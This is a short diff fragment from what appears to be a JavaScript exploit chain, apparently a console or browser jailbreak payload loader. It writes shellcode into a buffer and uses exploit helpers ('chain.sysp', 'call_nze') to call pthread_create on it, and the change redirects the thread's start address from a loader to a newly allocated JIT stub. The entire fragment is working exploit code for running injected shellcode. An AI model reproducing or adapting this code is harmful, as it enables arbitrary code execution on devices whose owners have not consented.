@@ -1943,14 +1943,9 @@ var loader_addr = chain.sysp(
    var shellcode = new Uint32Array(tmp.buffer);
    pl.set(shellcode,0);
    var pthread = malloc(0x10);
-   
-    call_nze(
-        'pthread_create',
-        pthread,
-        0,
-        loader_addr,
-        payload_buffer,
-    );	
+   const stub_addr = allocate_jit_stub();
+   call_nze('pthread_create', pthread, 0, stub_addr, payload_buffer);
+
    }
  };
 
